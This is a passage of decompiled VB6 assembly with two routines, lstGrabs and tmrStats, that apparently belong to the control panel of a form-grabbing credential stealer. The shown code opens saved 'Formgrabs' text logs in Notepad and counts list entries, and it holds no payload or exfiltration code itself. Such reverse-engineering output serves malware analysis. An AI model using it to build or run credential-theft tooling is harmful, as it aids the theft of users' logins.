008B4C13: movsd 
008B4C14: movsd 
008B4C15: movsd 
008B4C16: mov eax, [ebp+08h]
008B4C19: mov eax, [eax]
008B4C1B: push [ebp+08h]
008B4C1E: call [eax+0000030Ch]
008B4C24: push eax
008B4C25: lea eax, var_18
008B4C28: push eax
008B4C29: call 00410A84h ; Set (object)
008B4C2E: push eax
008B4C2F: mov eax, [ebp+08h]
008B4C32: mov eax, [eax]
008B4C34: push [ebp+08h]
008B4C37: call [eax+000002BCh]
008B4C3D: fclex 
008B4C3F: mov var_5C, eax
008B4C42: cmp var_5C, 00000000h
008B4C46: jnl 8B4C62h
008B4C48: push 000002BCh
008B4C4D: push 00446B98h
008B4C52: push [ebp+08h]
008B4C55: push var_5C
008B4C58: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B4C5D: mov var_68, eax
008B4C60: jmp 8B4C66h
008B4C62: and var_68, 00000000h
008B4C66: lea ecx, var_18
008B4C69: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008B4C6E: mov var_04, 00000000h
008B4C75: push 008B4C86h
008B4C7A: jmp 8B4C85h
008B4C7C: lea ecx, var_18
008B4C7F: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008B4C84: ret 
End Sub

Private sub lstGrabs__8B385D
008B385D: push ebp
008B385E: mov ebp, esp
008B3860: sub esp, 00000018h
008B3863: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008B3868: mov eax, fs:[00h]
008B386E: push eax
008B386F: mov fs:[00000000h], esp
008B3876: mov eax, 0000031Ch
008B387B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B3880: push ebx
008B3881: push esi
008B3882: push edi
008B3883: mov var_18, esp
008B3886: mov var_14, 0040EB20h
008B388D: mov eax, [ebp+08h]
008B3890: and eax, 00000001h
008B3893: mov var_10, eax
008B3896: mov eax, [ebp+08h]
008B3899: and al, FEh
008B389B: mov [ebp+08h], eax
008B389E: mov var_0C, 00000000h
008B38A5: mov eax, [ebp+08h]
008B38A8: mov eax, [eax]
008B38AA: push [ebp+08h]
008B38AD: call [eax+04h]
008B38B0: mov var_04, 00000001h
008B38B7: mov var_04, 00000002h
008B38BE: push FFFFFFFFh
008B38C0: call 00410A60h ; On Error ...
008B38C5: mov var_04, 00000003h
008B38CC: push 00000020h
008B38CE: lea eax, var_74
008B38D1: push eax
008B38D2: call 004108CEh ; arg_1 = arg_3 & Chr(arg_2)
008B38D7: cmp [008F529Ch], 00000000h
008B38DE: jnz 8B38FBh
008B38E0: push 008F529Ch
008B38E5: push 00440F2Ch
008B38EA: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B38EF: mov var_00000320, 008F529Ch
008B38F9: jmp 8B3905h
008B38FB: mov var_00000320, 008F529Ch
008B3905: mov eax, var_00000320
008B390B: mov eax, [eax]
008B390D: mov var_000002D8, eax
008B3913: lea eax, var_34
008B3916: push eax
008B3917: mov eax, var_000002D8
008B391D: mov eax, [eax]
008B391F: push var_000002D8
008B3925: call [eax+14h]
008B3928: fclex 
008B392A: mov var_000002DC, eax
008B3930: cmp var_000002DC, 00000000h
008B3937: jnl 8B3959h
008B3939: push 00000014h
008B393B: push 00440F1Ch
008B3940: push var_000002D8
008B3946: push var_000002DC
008B394C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B3951: mov var_00000324, eax
008B3957: jmp 8B3960h
008B3959: and var_00000324, 00000000h
008B3960: mov eax, var_34
008B3963: mov var_000002E0, eax
008B3969: lea eax, var_24
008B396C: push eax
008B396D: mov eax, var_000002E0
008B3973: mov eax, [eax]
008B3975: push var_000002E0
008B397B: call [eax+50h]
008B397E: fclex 
008B3980: mov var_000002E4, eax
008B3986: cmp var_000002E4, 00000000h
008B398D: jnl 8B39AFh
008B398F: push 00000050h
008B3991: push 00440F3Ch
008B3996: push var_000002E0
008B399C: push var_000002E4
008B39A2: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B39A7: mov var_00000328, eax
008B39AD: jmp 8B39B6h
008B39AF: and var_00000328, 00000000h
008B39B6: mov var_0000023C, 00000007h
008B39C0: mov var_00000244, 00000003h
008B39CA: push 004412DCh
008B39CF: push 00000000h
008B39D1: push 0000000Dh
008B39D3: mov eax, [ebp+08h]
008B39D6: mov eax, [eax]
008B39D8: push [ebp+08h]
008B39DB: call [eax+00000324h]
008B39E1: push eax
008B39E2: lea eax, var_38
008B39E5: push eax
008B39E6: call 00410A84h ; Set (object)
008B39EB: push eax
008B39EC: lea eax, var_000000C4
008B39F2: push eax
008B39F3: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B39F8: add esp, 00000010h
008B39FB: push eax
008B39FC: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B3A01: push eax
008B3A02: lea eax, var_3C
008B3A05: push eax
008B3A06: call 00410A84h ; Set (object)
008B3A0B: mov var_000002E8, eax
008B3A11: lea eax, var_28
008B3A14: push eax
008B3A15: mov eax, var_000002E8
008B3A1B: mov eax, [eax]
008B3A1D: push var_000002E8
008B3A23: call [eax+4Ch]
008B3A26: fclex 
008B3A28: mov var_000002EC, eax
008B3A2E: cmp var_000002EC, 00000000h
008B3A35: jnl 8B3A57h
008B3A37: push 0000004Ch
008B3A39: push 004412DCh
008B3A3E: push var_000002E8
008B3A44: push var_000002EC
008B3A4A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B3A4F: mov var_0000032C, eax
008B3A55: jmp 8B3A5Eh
008B3A57: and var_0000032C, 00000000h
008B3A5E: mov eax, var_28
008B3A61: mov var_00000314, eax
008B3A67: and var_28, 00000000h
008B3A6B: mov eax, var_00000314
008B3A71: mov var_000000DC, eax
008B3A77: mov var_000000E4, 00000008h
008B3A81: cmp [008F2010h], 00000000h
008B3A88: jnz 8B3AA5h
008B3A8A: push 008F2010h
008B3A8F: push 00433984h
008B3A94: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B3A99: mov var_00000330, 008F2010h
008B3AA3: jmp 8B3AAFh
008B3AA5: mov var_00000330, 008F2010h
008B3AAF: push 00000010h
008B3AB1: pop eax
008B3AB2: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B3AB7: lea esi, var_00000244
008B3ABD: mov edi, esp
008B3ABF: movsd 
008B3AC0: movsd 
008B3AC1: movsd 
008B3AC2: movsd 
008B3AC3: push 00000001h
008B3AC5: push 00000010h
008B3AC7: push 00440E58h
008B3ACC: push 00000010h
008B3ACE: pop eax
008B3ACF: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B3AD4: lea esi, var_000000E4
008B3ADA: mov edi, esp
008B3ADC: movsd 
008B3ADD: movsd 
008B3ADE: movsd 
008B3ADF: movsd 
008B3AE0: push 00000001h
008B3AE2: push 00000000h
008B3AE4: push 00440E48h
008B3AE9: push 00000000h
008B3AEB: push 00000018h
008B3AED: mov eax, var_00000330
008B3AF3: mov eax, [eax]
008B3AF5: mov ecx, var_00000330
008B3AFB: mov ecx, [ecx]
008B3AFD: mov ecx, [ecx]
008B3AFF: push eax
008B3B00: call [ecx+00000550h]
008B3B06: push eax
008B3B07: lea eax, var_40
008B3B0A: push eax
008B3B0B: call 00410A84h ; Set (object)
008B3B10: push eax
008B3B11: lea eax, var_000000D4
008B3B17: push eax
008B3B18: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B3B1D: add esp, 00000010h
008B3B20: push eax
008B3B21: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B3B26: push eax
008B3B27: lea eax, var_44
008B3B2A: push eax
008B3B2B: call 00410A84h ; Set (object)
008B3B30: push eax
008B3B31: lea eax, var_000000F4
008B3B37: push eax
008B3B38: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B3B3D: add esp, 00000020h
008B3B40: push eax
008B3B41: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B3B46: push eax
008B3B47: lea eax, var_48
008B3B4A: push eax
008B3B4B: call 00410A84h ; Set (object)
008B3B50: push eax
008B3B51: lea eax, var_00000104
008B3B57: push eax
008B3B58: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B3B5D: add esp, 00000020h
008B3B60: mov var_0000027C, 00000006h
008B3B6A: mov var_00000284, 00000003h
008B3B74: push 004412DCh
008B3B79: push 00000000h
008B3B7B: push 0000000Dh
008B3B7D: mov eax, [ebp+08h]
008B3B80: mov eax, [eax]
008B3B82: push [ebp+08h]
008B3B85: call [eax+00000324h]
008B3B8B: push eax
008B3B8C: lea eax, var_4C
008B3B8F: push eax
008B3B90: call 00410A84h ; Set (object)
008B3B95: push eax
008B3B96: lea eax, var_00000144
008B3B9C: push eax
008B3B9D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B3BA2: add esp, 00000010h
008B3BA5: push eax
008B3BA6: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B3BAB: push eax
008B3BAC: lea eax, var_50
008B3BAF: push eax
008B3BB0: call 00410A84h ; Set (object)
008B3BB5: mov var_000002F0, eax
008B3BBB: lea eax, var_2C
008B3BBE: push eax
008B3BBF: mov eax, var_000002F0
008B3BC5: mov eax, [eax]
008B3BC7: push var_000002F0
008B3BCD: call [eax+4Ch]
008B3BD0: fclex 
008B3BD2: mov var_000002F4, eax
008B3BD8: cmp var_000002F4, 00000000h
008B3BDF: jnl 8B3C01h
008B3BE1: push 0000004Ch
008B3BE3: push 004412DCh
008B3BE8: push var_000002F0
008B3BEE: push var_000002F4
008B3BF4: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B3BF9: mov var_00000334, eax
008B3BFF: jmp 8B3C08h
008B3C01: and var_00000334, 00000000h
008B3C08: mov eax, var_2C
008B3C0B: mov var_00000318, eax
008B3C11: and var_2C, 00000000h
008B3C15: mov eax, var_00000318
008B3C1B: mov var_0000015C, eax
008B3C21: mov var_00000164, 00000008h
008B3C2B: cmp [008F2010h], 00000000h
008B3C32: jnz 8B3C4Fh
008B3C34: push 008F2010h
008B3C39: push 00433984h
008B3C3E: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B3C43: mov var_00000338, 008F2010h
008B3C4D: jmp 8B3C59h
008B3C4F: mov var_00000338, 008F2010h
008B3C59: push 00000010h
008B3C5B: pop eax
008B3C5C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B3C61: lea esi, var_00000284
008B3C67: mov edi, esp
008B3C69: movsd 
008B3C6A: movsd 
008B3C6B: movsd 
008B3C6C: movsd 
008B3C6D: push 00000001h
008B3C6F: push 00000010h
008B3C71: push 00440E58h
008B3C76: push 00000010h
008B3C78: pop eax
008B3C79: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B3C7E: lea esi, var_00000164
008B3C84: mov edi, esp
008B3C86: movsd 
008B3C87: movsd 
008B3C88: movsd 
008B3C89: movsd 
008B3C8A: push 00000001h
008B3C8C: push 00000000h
008B3C8E: push 00440E48h
008B3C93: push 00000000h
008B3C95: push 00000018h
008B3C97: mov eax, var_00000338
008B3C9D: mov eax, [eax]
008B3C9F: mov ecx, var_00000338
008B3CA5: mov ecx, [ecx]
008B3CA7: mov ecx, [ecx]
008B3CA9: push eax
008B3CAA: call [ecx+00000550h]
008B3CB0: push eax
008B3CB1: lea eax, var_54
008B3CB4: push eax
008B3CB5: call 00410A84h ; Set (object)
008B3CBA: push eax
008B3CBB: lea eax, var_00000154
008B3CC1: push eax
008B3CC2: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B3CC7: add esp, 00000010h
008B3CCA: push eax
008B3CCB: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B3CD0: push eax
008B3CD1: lea eax, var_58
008B3CD4: push eax
008B3CD5: call 00410A84h ; Set (object)
008B3CDA: push eax
008B3CDB: lea eax, var_00000174
008B3CE1: push eax
008B3CE2: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B3CE7: add esp, 00000020h
008B3CEA: push eax
008B3CEB: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B3CF0: push eax
008B3CF1: lea eax, var_5C
008B3CF4: push eax
008B3CF5: call 00410A84h ; Set (object)
008B3CFA: push eax
008B3CFB: lea eax, var_00000184
008B3D01: push eax
008B3D02: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B3D07: add esp, 00000020h
008B3D0A: push 004412DCh
008B3D0F: push 00000000h
008B3D11: push 0000000Dh
008B3D13: mov eax, [ebp+08h]
008B3D16: mov eax, [eax]
008B3D18: push [ebp+08h]
008B3D1B: call [eax+00000324h]
008B3D21: push eax
008B3D22: lea eax, var_60
008B3D25: push eax
008B3D26: call 00410A84h ; Set (object)
008B3D2B: push eax
008B3D2C: lea eax, var_000001C4
008B3D32: push eax
008B3D33: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B3D38: add esp, 00000010h
008B3D3B: push eax
008B3D3C: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B3D41: push eax
008B3D42: lea eax, var_64
008B3D45: push eax
008B3D46: call 00410A84h ; Set (object)
008B3D4B: mov var_000002F8, eax
008B3D51: lea eax, var_30
008B3D54: push eax
008B3D55: mov eax, var_000002F8
008B3D5B: mov eax, [eax]
008B3D5D: push var_000002F8
008B3D63: call [eax+4Ch]
008B3D66: fclex 
008B3D68: mov var_000002FC, eax
008B3D6E: cmp var_000002FC, 00000000h
008B3D75: jnl 8B3D97h
008B3D77: push 0000004Ch
008B3D79: push 004412DCh
008B3D7E: push var_000002F8
008B3D84: push var_000002FC
008B3D8A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B3D8F: mov var_0000033C, eax
008B3D95: jmp 8B3D9Eh
008B3D97: and var_0000033C, 00000000h
008B3D9E: push var_30
008B3DA1: call 004109DCh ; Val(arg_1)
008B3DA6: fstp real8 ptr var_000002D4
008B3DAC: push 00000020h
008B3DAE: lea eax, var_000001F4
008B3DB4: push eax
008B3DB5: call 004108CEh ; arg_1 = arg_3 & Chr(arg_2)
008B3DBA: mov var_0000020C, 0044BA20h ; notepad
008B3DC4: mov var_00000214, 00000008h
008B3DCE: mov eax, var_24
008B3DD1: mov var_0000031C, eax
008B3DD7: and var_24, 00000000h
008B3DDB: mov eax, var_0000031C
008B3DE1: mov var_0000008C, eax
008B3DE7: mov var_00000094, 00000008h
008B3DF1: mov var_0000021C, 0044A8C4h ; \Formgrabs\
008B3DFB: mov var_00000224, 00000008h
008B3E05: lea eax, var_00000104
008B3E0B: push eax
008B3E0C: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008B3E11: mov var_0000010C, eax
008B3E17: mov var_00000114, 00000008h
008B3E21: mov var_0000025C, 004495B0h
008B3E2B: mov var_00000264, 00000008h
008B3E35: lea eax, var_00000184
008B3E3B: push eax
008B3E3C: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008B3E41: mov var_0000018C, eax
008B3E47: mov var_00000194, 00000008h
008B3E51: mov var_0000029C, 0044A82Ch
008B3E5B: mov var_000002A4, 00000008h
008B3E65: fld real8 ptr var_000002D4
008B3E6B: call 00410814h ; msvbvm60.dll.__vbaFpI4
008B3E70: push eax
008B3E71: push [008F2074h]
008B3E77: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008B3E7C: mov eax, [eax]
008B3E7E: mov var_000002AC, eax
008B3E84: mov var_000002B4, 00000008h
008B3E8E: mov var_000002BC, 0044A834h ; .txt
008B3E98: mov var_000002C4, 00000008h
008B3EA2: push 00000001h
008B3EA4: lea eax, var_00000214
008B3EAA: push eax
008B3EAB: lea eax, var_74
008B3EAE: push eax
008B3EAF: lea eax, var_00000084
008B3EB5: push eax
008B3EB6: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008B3EBB: push eax
008B3EBC: lea eax, var_00000094
008B3EC2: push eax
008B3EC3: lea eax, var_000000A4
008B3EC9: push eax
008B3ECA: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008B3ECF: push eax
008B3ED0: lea eax, var_00000224
008B3ED6: push eax
008B3ED7: lea eax, var_000000B4
008B3EDD: push eax
008B3EDE: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008B3EE3: push eax
008B3EE4: lea eax, var_00000114
008B3EEA: push eax
008B3EEB: lea eax, var_00000124
008B3EF1: push eax
008B3EF2: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008B3EF7: push eax
008B3EF8: lea eax, var_00000264
008B3EFE: push eax
008B3EFF: lea eax, var_00000134
008B3F05: push eax
008B3F06: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008B3F0B: push eax
008B3F0C: lea eax, var_00000194
008B3F12: push eax
008B3F13: lea eax, var_000001A4
008B3F19: push eax
008B3F1A: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008B3F1F: push eax
008B3F20: lea eax, var_000002A4
008B3F26: push eax
008B3F27: lea eax, var_000001B4
008B3F2D: push eax
008B3F2E: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008B3F33: push eax
008B3F34: lea eax, var_000002B4
008B3F3A: push eax
008B3F3B: lea eax, var_000001D4
008B3F41: push eax
008B3F42: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008B3F47: push eax
008B3F48: lea eax, var_000002C4
008B3F4E: push eax
008B3F4F: lea eax, var_000001E4
008B3F55: push eax
008B3F56: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008B3F5B: push eax
008B3F5C: lea eax, var_000001F4
008B3F62: push eax
008B3F63: lea eax, var_00000204
008B3F69: push eax
008B3F6A: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008B3F6F: push eax
008B3F70: call 00410A96h ; Shell
008B3F75: fstp real8 ptr var_000002CC
008B3F7B: lea ecx, var_30
008B3F7E: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
008B3F83: lea eax, var_64
008B3F86: push eax
008B3F87: lea eax, var_60
008B3F8A: push eax
008B3F8B: lea eax, var_5C
008B3F8E: push eax
008B3F8F: lea eax, var_58
008B3F92: push eax
008B3F93: lea eax, var_54
008B3F96: push eax
008B3F97: lea eax, var_50
008B3F9A: push eax
008B3F9B: lea eax, var_4C
008B3F9E: push eax
008B3F9F: lea eax, var_48
008B3FA2: push eax
008B3FA3: lea eax, var_44
008B3FA6: push eax
008B3FA7: lea eax, var_40
008B3FAA: push eax
008B3FAB: lea eax, var_3C
008B3FAE: push eax
008B3FAF: lea eax, var_38
008B3FB2: push eax
008B3FB3: lea eax, var_34
008B3FB6: push eax
008B3FB7: push 0000000Dh
008B3FB9: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B3FBE: add esp, 00000038h
008B3FC1: lea eax, var_00000204
008B3FC7: push eax
008B3FC8: lea eax, var_000001F4
008B3FCE: push eax
008B3FCF: lea eax, var_000001E4
008B3FD5: push eax
008B3FD6: lea eax, var_000001D4
008B3FDC: push eax
008B3FDD: lea eax, var_000001B4
008B3FE3: push eax
008B3FE4: lea eax, var_000001C4
008B3FEA: push eax
008B3FEB: lea eax, var_000001A4
008B3FF1: push eax
008B3FF2: lea eax, var_00000194
008B3FF8: push eax
008B3FF9: lea eax, var_00000134
008B3FFF: push eax
008B4000: lea eax, var_00000184
008B4006: push eax
008B4007: lea eax, var_00000174
008B400D: push eax
008B400E: lea eax, var_00000164
008B4014: push eax
008B4015: lea eax, var_00000154
008B401B: push eax
008B401C: lea eax, var_00000144
008B4022: push eax
008B4023: lea eax, var_00000124
008B4029: push eax
008B402A: lea eax, var_00000114
008B4030: push eax
008B4031: lea eax, var_000000B4
008B4037: push eax
008B4038: lea eax, var_00000104
008B403E: push eax
008B403F: lea eax, var_000000F4
008B4045: push eax
008B4046: lea eax, var_000000E4
008B404C: push eax
008B404D: lea eax, var_000000D4
008B4053: push eax
008B4054: lea eax, var_000000C4
008B405A: push eax
008B405B: lea eax, var_000000A4
008B4061: push eax
008B4062: lea eax, var_00000094
008B4068: push eax
008B4069: lea eax, var_00000084
008B406F: push eax
008B4070: lea eax, var_74
008B4073: push eax
008B4074: push 0000001Ah
008B4076: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B407B: add esp, 0000006Ch
008B407E: mov var_10, 00000000h
008B4085: wait 
008B4086: push 008B41A7h
008B408B: jmp 008B41A6h
008B4090: lea eax, var_30
008B4093: push eax
008B4094: lea eax, var_2C
008B4097: push eax
008B4098: lea eax, var_28
008B409B: push eax
008B409C: lea eax, var_24
008B409F: push eax
008B40A0: push 00000004h
008B40A2: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008B40A7: add esp, 00000014h
008B40AA: lea eax, var_64
008B40AD: push eax
008B40AE: lea eax, var_60
008B40B1: push eax
008B40B2: lea eax, var_5C
008B40B5: push eax
008B40B6: lea eax, var_58
008B40B9: push eax
008B40BA: lea eax, var_54
008B40BD: push eax
008B40BE: lea eax, var_50
008B40C1: push eax
008B40C2: lea eax, var_4C
008B40C5: push eax
008B40C6: lea eax, var_48
008B40C9: push eax
008B40CA: lea eax, var_44
008B40CD: push eax
008B40CE: lea eax, var_40
008B40D1: push eax
008B40D2: lea eax, var_3C
008B40D5: push eax
008B40D6: lea eax, var_38
008B40D9: push eax
008B40DA: lea eax, var_34
008B40DD: push eax
008B40DE: push 0000000Dh
008B40E0: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B40E5: add esp, 00000038h
008B40E8: lea eax, var_00000204
008B40EE: push eax
008B40EF: lea eax, var_000001F4
008B40F5: push eax
008B40F6: lea eax, var_000001E4
008B40FC: push eax
008B40FD: lea eax, var_000001D4
008B4103: push eax
008B4104: lea eax, var_000001C4
008B410A: push eax
008B410B: lea eax, var_000001B4
008B4111: push eax
008B4112: lea eax, var_000001A4
008B4118: push eax
008B4119: lea eax, var_00000194
008B411F: push eax
008B4120: lea eax, var_00000184
008B4126: push eax
008B4127: lea eax, var_00000174
008B412D: push eax
008B412E: lea eax, var_00000164
008B4134: push eax
008B4135: lea eax, var_00000154
008B413B: push eax
008B413C: lea eax, var_00000144
008B4142: push eax
008B4143: lea eax, var_00000134
008B4149: push eax
008B414A: lea eax, var_00000124
008B4150: push eax
008B4151: lea eax, var_00000114
008B4157: push eax
008B4158: lea eax, var_00000104
008B415E: push eax
008B415F: lea eax, var_000000F4
008B4165: push eax
008B4166: lea eax, var_000000E4
008B416C: push eax
008B416D: lea eax, var_000000D4
008B4173: push eax
008B4174: lea eax, var_000000C4
008B417A: push eax
008B417B: lea eax, var_000000B4
008B4181: push eax
008B4182: lea eax, var_000000A4
008B4188: push eax
008B4189: lea eax, var_00000094
008B418F: push eax
008B4190: lea eax, var_00000084
008B4196: push eax
008B4197: lea eax, var_74
008B419A: push eax
008B419B: push 0000001Ah
008B419D: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B41A2: add esp, 0000006Ch
008B41A5: ret 
End Sub

Private sub tmrStats__8B8430
008B8430: push ebp
008B8431: mov ebp, esp
008B8433: sub esp, 0000000Ch
008B8436: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008B843B: mov eax, fs:[00h]
008B8441: push eax
008B8442: mov fs:[00000000h], esp
008B8449: mov eax, 00000100h
008B844E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B8453: push ebx
008B8454: push esi
008B8455: push edi
008B8456: mov var_0C, esp
008B8459: mov var_08, 0040EDA0h
008B8460: mov eax, [ebp+08h]
008B8463: and eax, 00000001h
008B8466: mov var_04, eax
008B8469: mov eax, [ebp+08h]
008B846C: and al, FEh
008B846E: mov [ebp+08h], eax
008B8471: mov eax, [ebp+08h]
008B8474: mov eax, [eax]
008B8476: push [ebp+08h]
008B8479: call [eax+04h]
008B847C: cmp word ptr [008F2430h], FFFFh
008B8484: jnz 008B86FCh
008B848A: mov var_74, 00000001h
008B8491: mov var_7C, 00000002h
008B8498: cmp [008F2010h], 00000000h
008B849F: jnz 8B84BCh
008B84A1: push 008F2010h
008B84A6: push 00433984h
008B84AB: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B84B0: mov var_00000100, 008F2010h
008B84BA: jmp 8B84C6h
008B84BC: mov var_00000100, 008F2010h
008B84C6: push 00000000h
008B84C8: push 00000001h
008B84CA: push 00440E48h
008B84CF: push 00000000h
008B84D1: push 00000018h
008B84D3: mov eax, var_00000100
008B84D9: mov eax, [eax]
008B84DB: mov ecx, var_00000100
008B84E1: mov ecx, [ecx]
008B84E3: mov ecx, [ecx]
008B84E5: push eax
008B84E6: call [ecx+0000054Ch]
008B84EC: push eax
008B84ED: lea eax, var_34
008B84F0: push eax
008B84F1: call 00410A84h ; Set (object)
008B84F6: push eax
008B84F7: lea eax, var_4C
008B84FA: push eax
008B84FB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B8500: add esp, 00000010h
008B8503: push eax
008B8504: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B8509: push eax
008B850A: lea eax, var_38
008B850D: push eax
008B850E: call 00410A84h ; Set (object)
008B8513: push eax
008B8514: lea eax, var_5C
008B8517: push eax
008B8518: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B851D: add esp, 00000010h
008B8520: push eax
008B8521: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008B8526: mov var_00000084, eax
008B852C: mov var_0000008C, 00000003h
008B8536: mov var_00000094, 00000001h
008B8540: mov var_0000009C, 00000002h
008B854A: lea eax, var_7C
008B854D: push eax
008B854E: lea eax, var_0000008C
008B8554: push eax
008B8555: lea eax, var_0000009C
008B855B: push eax
008B855C: lea eax, var_000000CC
008B8562: push eax
008B8563: lea eax, var_000000BC
008B8569: push eax
008B856A: lea eax, var_24
008B856D: push eax
008B856E: call 00410A3Ch ; For
008B8573: mov var_000000F8, eax
008B8579: lea eax, var_38
008B857C: push eax
008B857D: lea eax, var_34
008B8580: push eax
008B8581: push 00000002h
008B8583: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B8588: add esp, 0000000Ch
008B858B: lea eax, var_5C
008B858E: push eax
008B858F: lea eax, var_4C
008B8592: push eax
008B8593: push 00000002h
008B8595: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B859A: add esp, 0000000Ch
008B859D: jmp 008B86EAh
008B85A2: lea eax, var_24
008B85A5: mov var_74, eax
008B85A8: mov var_7C, 0000400Ch
008B85AF: cmp [008F2010h], 00000000h
008B85B6: jnz 8B85D3h
008B85B8: push 008F2010h
008B85BD: push 00433984h
008B85C2: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B85C7: mov var_00000104, 008F2010h
008B85D1: jmp 8B85DDh
008B85D3: mov var_00000104, 008F2010h
008B85DD: push 00000000h
008B85DF: push 00000004h
008B85E1: push 00440E58h
008B85E6: push 00000010h
008B85E8: pop eax
008B85E9: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B85EE: lea esi, var_7C
008B85F1: mov edi, esp
008B85F3: movsd 
008B85F4: movsd 
008B85F5: movsd 
008B85F6: movsd 
008B85F7: push 00000001h
008B85F9: push 00000000h
008B85FB: push 00440E48h
008B8600: push 00000000h
008B8602: push 00000018h
008B8604: mov eax, var_00000104
008B860A: mov eax, [eax]
008B860C: mov ecx, var_00000104
008B8612: mov ecx, [ecx]
008B8614: mov ecx, [ecx]
008B8616: push eax
008B8617: call [ecx+0000054Ch]
008B861D: push eax
008B861E: lea eax, var_34
008B8621: push eax
008B8622: call 00410A84h ; Set (object)
008B8627: push eax
008B8628: lea eax, var_4C
008B862B: push eax
008B862C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B8631: add esp, 00000010h
008B8634: push eax
008B8635: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B863A: push eax
008B863B: lea eax, var_38
008B863E: push eax
008B863F: call 00410A84h ; Set (object)
008B8644: push eax
008B8645: lea eax, var_5C
008B8648: push eax
008B8649: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B864E: add esp, 00000020h
008B8651: push eax
008B8652: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B8657: push eax
008B8658: lea eax, var_3C
008B865B: push eax
008B865C: call 00410A84h ; Set (object)
008B8661: push eax
008B8662: lea eax, var_6C
008B8665: push eax
008B8666: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B866B: add esp, 00000010h
008B866E: push eax
008B866F: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008B8674: sub ax, FFFFh
008B8678: neg ax
008B867B: sbb eax, eax
008B867D: inc eax
008B867E: neg eax
008B8680: mov var_000000A0, ax
008B8687: lea eax, var_3C
008B868A: push eax
008B868B: lea eax, var_38
008B868E: push eax
008B868F: lea eax, var_34
008B8692: push eax
008B8693: push 00000003h
008B8695: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B869A: add esp, 00000010h
008B869D: lea eax, var_6C
008B86A0: push eax
008B86A1: lea eax, var_5C
008B86A4: push eax
008B86A5: lea eax, var_4C
008B86A8: push eax
008B86A9: push 00000003h
008B86AB: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B86B0: add esp, 00000010h
008B86B3: movsx eax, word ptr var_000000A0
008B86BA: test eax, eax
008B86BC: jz 8B86CDh
008B86BE: mov eax, var_28
008B86C1: add eax, 00000001h
008B86C4: jo 008B8B61h
008B86CA: mov var_28, eax
008B86CD: lea eax, var_000000CC
008B86D3: push eax
008B86D4: lea eax, var_000000BC
008B86DA: push eax
008B86DB: lea eax, var_24
008B86DE: push eax
008B86DF: call 00410A36h ; Next
008B86E4: mov var_000000F8, eax
008B86EA: cmp var_000000F8, 00000000h
008B86F1: jnz 008B85A2h
008B86F7: jmp 008B8969h
008B86FC: mov var_74, 00000001h
